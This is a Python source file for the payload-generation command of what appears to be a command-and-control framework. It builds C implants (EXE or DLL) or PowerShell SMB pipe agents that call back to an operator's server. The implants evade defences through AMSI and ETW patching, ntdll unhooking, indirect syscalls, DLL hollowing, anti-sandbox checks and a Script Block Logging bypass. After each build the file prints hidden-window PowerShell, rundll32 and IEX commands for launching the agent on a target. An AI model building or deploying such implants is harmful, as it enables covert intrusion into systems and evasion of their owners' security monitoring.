"""
CLI 'generate' command — cross-compile C agent or generate PowerShell agent.

Usage in operator shell:
  generate                                    (defaults: current listener URL, keys/server_pub.pem)
  generate --url https://c2.example.com/api/v1 --sleep 30 --jitter 20
  generate --arch x86 --kill-date 2026-12-31
  generate --url https://... --sleep 10 --format dll
  generate --format powershell --listener SMB
"""

import shlex
import sys
from pathlib import Path

from rich.console import Console

console = Console(stderr=True)


def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
    """Parse generate arguments and invoke the appropriate build."""

    # Parse arguments from the command string
    parts = shlex.split(args_str) if args_str else []
    opts = {
        "url": "",
        "sleep": 60,
        "jitter": 25,
        "arch": "x64",
        "kill_date": "",
        "magic": 0xDEADF00D,
        "output": None,
        "format": "exe",
        "listener": "",
        "pipe_host": "",
        "no_evasion": False,
        "no_sandbox": False,
        "no_unhook": False,
        "no_etw": False,
        "no_amsi": False,
        "no_pe_stomp": False,
        "no_stack_spoofing": False,
        "no_indirect_syscalls": False,
        "no_module_stomp": False,
        "no_phantom_hollow": False,
        "no_crypt": False,
        "no_sbl": False,
        "target_os": "win10",
        "debug": False,
    }

    # Boolean flags (no argument following)
    bool_flags = {
        "--no-evasion": "no_evasion",
        "--no-sandbox": "no_sandbox",
        "--no-unhook": "no_unhook",
        "--no-etw": "no_etw",
        "--no-amsi": "no_amsi",
        "--no-pe-stomp": "no_pe_stomp",
        "--no-stack-spoofing": "no_stack_spoofing",
        "--no-indirect-syscalls": "no_indirect_syscalls",
        "--no-module-stomp": "no_module_stomp",
        "--no-phantom-hollow": "no_phantom_hollow",
        "--no-crypt": "no_crypt",
        "--no-sbl": "no_sbl",
        "--debug": "debug",
    }

    i = 0
    while i < len(parts):
        if parts[i] in ("--url", "-u") and i + 1 < len(parts):
            opts["url"] = parts[i + 1]; i += 2
        elif parts[i] in ("--sleep", "-s") and i + 1 < len(parts):
            opts["sleep"] = int(parts[i + 1]); i += 2
        elif parts[i] in ("--jitter", "-j") and i + 1 < len(parts):
            opts["jitter"] = int(parts[i + 1]); i += 2
        elif parts[i] in ("--arch", "-a") and i + 1 < len(parts):
            opts["arch"] = parts[i + 1]; i += 2
        elif parts[i] == "--kill-date" and i + 1 < len(parts):
            opts["kill_date"] = parts[i + 1]; i += 2
        elif parts[i] == "--magic" and i + 1 < len(parts):
            m = parts[i + 1]
            opts["magic"] = int(m, 16) if m.startswith("0x") else int(m)
            i += 2
        elif parts[i] == "--target-os" and i + 1 < len(parts):
            val = parts[i + 1]
            if val not in ("win10", "win11"):
                console.print(f"[red]--target-os must be win10 or win11, got: {val}[/red]")
                return
            opts["target_os"] = val; i += 2
        elif parts[i] in ("--format", "-f") and i + 1 < len(parts):
            val = parts[i + 1]
            if val not in ("exe", "dll", "powershell"):
                console.print(f"[red]--format must be exe, dll, or powershell, got: {val}[/red]")
                return
            opts["format"] = val; i += 2
        elif parts[i] in ("--listener", "-l") and i + 1 < len(parts):
            opts["listener"] = parts[i + 1]; i += 2
        elif parts[i] == "--pipe-host" and i + 1 < len(parts):
            opts["pipe_host"] = parts[i + 1]; i += 2
        elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
            opts["output"] = Path(parts[i + 1]); i += 2
        elif parts[i] in bool_flags:
            opts[bool_flags[parts[i]]] = True; i += 1
        elif parts[i] in ("--help", "-h"):
            _print_help()
            return
        else:
            console.print(f"[red]Unknown option: {parts[i]}[/red]")
            _print_help()
            return

    # ─── PowerShell agent path ────────────────────────────────────────
    if opts["format"] == "powershell":
        _build_powershell(opts, project_root, listeners)
        return

    # ─── C agent path (exe / dll) ─────────────────────────────────────

    # Auto-detect listener URL if not specified
    if not opts["url"]:
        if listeners:
            info = listeners[0].info()
            scheme = "https" if "HTTPS" in info.get("type", "") else "http"
            host = info.get("interface", "127.0.0.1")
            if host == "0.0.0.0":
                host = "127.0.0.1"
            port = info.get("port", 8443)
            opts["url"] = f"{scheme}://{host}:{port}/api/v1"
            console.print(f"[dim]Using listener URL: {opts['url']}[/dim]")
        else:
            opts["url"] = "https://127.0.0.1:8443/api/v1"
            console.print("[yellow]No active listener — using default URL[/yellow]")

    # Find RSA key
    rsa_path = project_root / "keys" / "server_pub.pem"
    if not rsa_path.exists():
        console.print("[yellow]⚠ No RSA key found at keys/server_pub.pem[/yellow]")
        console.print("[yellow]  Run 'python scripts/generate_keys.py' first.[/yellow]")
        console.print("[yellow]  Building without RSA key (key exchange will fail).[/yellow]")
        rsa_path = None

    # Find profile
    profile_path = project_root / "profiles" / "default.yaml"
    if not profile_path.exists():
        profile_path = None

    # Check MinGW
    cc = "x86_64-w64-mingw32-gcc" if opts["arch"] == "x64" else "i686-w64-mingw32-gcc"
    import shutil
    if not shutil.which(cc):
        console.print(f"[red]✗ {cc} not found![/red]")
        console.print("[yellow]  Install mingw-w64:[/yellow]")
        console.print("[yellow]    sudo apt install mingw-w64[/yellow]")
        return

    fmt_label = "DLL" if opts["format"] == "dll" else "EXE"
    console.print(f"[cyan]Generating {opts['arch']} agent ({fmt_label})...[/cyan]")
    console.print(f"  C2 URL:    {opts['url']}")
    console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
    console.print(f"  Format:    {fmt_label}")
    if opts["kill_date"]:
        console.print(f"  Kill date: {opts['kill_date']}")

    # Import and invoke build
    sys.path.insert(0, str(project_root / "scripts"))
    from build_agent_c import build_agent

    # Show evasion/debug flags
    active_flags = [k for k in ("debug", "no_evasion", "no_sandbox", "no_unhook",
                                 "no_etw", "no_amsi", "no_pe_stomp", "no_stack_spoofing",
                                 "no_indirect_syscalls", "no_module_stomp",
                                 "no_phantom_hollow", "no_crypt")
                    if opts[k]]
    if active_flags:
        console.print(f"  Flags:     {', '.join('--' + f.replace('_', '-') for f in active_flags)}")
    console.print(f"  Target OS: {opts['target_os']}")
    console.print()

    try:
        out_path = build_agent(
            project_root,
            listener_url=opts["url"],
            rsa_pubkey_path=rsa_path,
            sleep_sec=opts["sleep"],
            jitter_pct=opts["jitter"],
            kill_date=opts["kill_date"],
            magic=opts["magic"],
            arch=opts["arch"],
            output_path=opts["output"],
            profile_path=profile_path,
            no_evasion=opts["no_evasion"],
            no_sandbox=opts["no_sandbox"],
            no_unhook=opts["no_unhook"],
            no_etw=opts["no_etw"],
            no_amsi=opts["no_amsi"],
            no_pe_stomp=opts["no_pe_stomp"],
            no_stack_spoof=opts["no_stack_spoofing"],
            no_indirect_syscalls=opts["no_indirect_syscalls"],
            no_module_stomp=opts["no_module_stomp"],
            no_phantom_hollow=opts["no_phantom_hollow"],
            target_os=opts["target_os"],
            debug=opts["debug"],
            no_crypt=opts["no_crypt"],
            format=opts["format"],
        )
        size_kb = out_path.stat().st_size / 1024
        console.print(f"[green]✓ Agent built: {out_path} ({size_kb:.1f} KB)[/green]")
        if opts["format"] == "dll":
            console.print()
            console.print("[dim]Load with:[/dim]")
            console.print(f"[dim]  rundll32 {out_path.name},Start[/dim]")
            console.print(f"[dim]  regsvr32 /s {out_path.name}[/dim]")
    except FileNotFoundError as e:
        console.print(f"[red]✗ {e}[/red]")
    except RuntimeError as e:
        console.print(f"[red]✗ Build failed:[/red]")
        console.print(str(e))


# ─── PowerShell build ────────────────────────────────────────────────

def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
    """Generate a PowerShell SMB pipe agent."""
    import base64

    # ── Resolve target SMB listener ──
    target_listener = None

    if opts["listener"]:
        for lst in listeners:
            if lst.name == opts["listener"]:
                target_listener = lst
                break
        if not target_listener:
            names = [l.name for l in listeners] if listeners else []
            console.print(f"[red]✗ Listener '{opts['listener']}' not found[/red]")
            if names:
                console.print(f"[yellow]  Available: {', '.join(names)}[/yellow]")
            return
    else:
        # Auto-detect first SMB listener
        for lst in listeners:
            if lst.listener_type == "SMB":
                target_listener = lst
                break
        if not target_listener:
            console.print("[red]✗ No SMB listener running[/red]")
            console.print("[yellow]  Start one first:  listeners start smb --pipename TSVCPIPE-... --name SMB[/yellow]")
            console.print("[yellow]  Or specify one:   generate --format powershell --listener <name>[/yellow]")
            return

    # Verify it's an SMB listener
    if target_listener.listener_type != "SMB":
        console.print(f"[red]✗ Listener '{target_listener.name}' is {target_listener.listener_type}, not SMB[/red]")
        return

    info = target_listener.info()
    pipe_name = info["port"].replace("pipe:", "")

    # Resolve pipe host: --pipe-host > --url > listener interface > fallback
    if opts["pipe_host"]:
        pipe_host = opts["pipe_host"]
    elif info["interface"] not in ("0.0.0.0", ""):
        pipe_host = info["interface"]
    elif opts["url"]:
        from urllib.parse import urlparse
        pipe_host = urlparse(opts["url"]).hostname or "127.0.0.1"
    else:
        pipe_host = "127.0.0.1"
        console.print(
            "[yellow]⚠ Listener bound to 0.0.0.0 — using 127.0.0.1 as pipe host.[/yellow]"
        )
        console.print(
            "[yellow]  Use --pipe-host <IP> to set the C2 address the agent connects to.[/yellow]"
        )

    console.print(f"[cyan]Generating PowerShell SMB agent...[/cyan]")
    console.print(f"  Listener:  {target_listener.name}")
    console.print(f"  Pipe:      \\\\{pipe_host}\\pipe\\{pipe_name}")
    console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
    if opts["kill_date"]:
        console.print(f"  Kill date: {opts['kill_date']}")

    # Show evasion status
    evasion_flags = []
    if opts["no_amsi"]:
        evasion_flags.append("--no-amsi")
    if opts["no_etw"]:
        evasion_flags.append("--no-etw")
    if opts["no_sbl"]:
        evasion_flags.append("--no-sbl")
    if evasion_flags:
        console.print(f"  Disabled:  {', '.join(evasion_flags)}")
    console.print()

    # Import and build
    sys.path.insert(0, str(project_root / "scripts"))
    from build_powershell import build_powershell_agent

    try:
        out_path, psk = build_powershell_agent(
            pipe_host=pipe_host,
            pipe_name=pipe_name,
            sleep_sec=opts["sleep"],
            jitter_pct=opts["jitter"],
            kill_date=opts["kill_date"],
            no_amsi=opts["no_amsi"],
            no_etw=opts["no_etw"],
            no_sbl=opts["no_sbl"],
            debug=opts["debug"],
            output_path=opts["output"],
        )
    except Exception as e:
        console.print(f"[red]✗ Build failed: {e}[/red]")
        return

    # Save PSK to keys/ so the listener can load it
    keys_dir = project_root / "keys"
    keys_dir.mkdir(exist_ok=True)
    psk_name = f"ps_{out_path.stem}.key"
    psk_path = keys_dir / psk_name
    psk_path.write_bytes(psk)

    # Register PSK with the running listener
    if hasattr(target_listener, "add_psk"):
        target_listener.add_psk(psk)

    size_kb = out_path.stat().st_size / 1024
    psk_b64 = base64.b64encode(psk).decode()

    console.print(f"[green]✓ PowerShell agent: {out_path} ({size_kb:.1f} KB)[/green]")
    console.print(f"[green]✓ PSK saved:        {psk_path}[/green]")
    console.print(f"[green]✓ PSK registered with listener '{target_listener.name}'[/green]")
    console.print()
    console.print("[dim]Execute on target:[/dim]")
    console.print(f"[dim]  powershell -ep bypass -f {out_path.name}[/dim]")
    console.print(f"[dim]  powershell -ep bypass -w hidden -f {out_path.name}[/dim]")
    console.print()
    console.print("[dim]One-liner (base64-encoded):[/dim]")
    console.print(f"[dim]  $s=[IO.File]::ReadAllText('{out_path.name}');IEX $s[/dim]")


# ─── Help ─────────────────────────────────────────────────────────────

def _print_help():
    console.print("""
[bold]generate[/bold] — Build agent payloads (C or PowerShell)

[bold]Format selection:[/bold]
  --format, -f FMT      Output format: exe (default), dll, or powershell
  --listener, -l NAME   Target listener by name (required for powershell
                         unless exactly one SMB listener is running)
  --pipe-host IP        C2 IP/hostname the PS agent connects to via SMB
                         (overrides listener interface and --url)

[bold]Common options:[/bold]
  --url, -u URL         C2 callback URL (C agent) / pipe host fallback (PS)
  --sleep, -s SEC       Beacon interval in seconds (default: 60)
  --jitter, -j PCT      Jitter percentage 0-99 (default: 25)
  --kill-date DATE      Agent self-destructs after YYYY-MM-DD
  --output, -o PATH     Output path
  --debug               Enable debug logging

[bold]C agent options (exe/dll):[/bold]
  --arch, -a ARCH       x64 or x86 (default: x64)
  --magic HEX           Packet magic bytes (default: 0xDEADF00D)
  --target-os OS        win10 or win11 (default: win10)

[bold]C agent evasion:[/bold]
  --no-evasion          Disable ALL evasion features
  --no-sandbox          Disable anti-sandbox checks only
  --no-unhook           Disable ntdll unhooking only
  --no-etw              Disable ETW patching only
  --no-amsi             Disable AMSI patching only
  --no-pe-stomp         Disable PE header stomping only
  --no-stack-spoofing   Disable thread stack spoofing (even on win11)
  --no-indirect-syscalls Disable indirect syscalls (Hell's Gate)
  --no-module-stomp    Disable module stomping for BOF .text sections
  --no-phantom-hollow  Disable phantom DLL hollowing
  --no-crypt            Skip polymorphic encryption

[bold]PowerShell agent evasion:[/bold]
  --no-amsi             Disable AMSI bypass
  --no-etw              Disable ETW bypass
  --no-sbl              Disable Script Block Logging bypass

[bold]Examples:[/bold]
  generate
  generate --format dll
  generate --format powershell --listener SMB --pipe-host 172.17.10.121
  generate --format powershell --listener SMB --pipe-host 10.0.0.5 --sleep 30
  generate --format powershell --listener SMB --no-amsi --no-etw
  generate --url https://cdn.example.com/api/v1 --sleep 30
  generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
  generate --arch x86 --kill-date 2026-12-31
""")
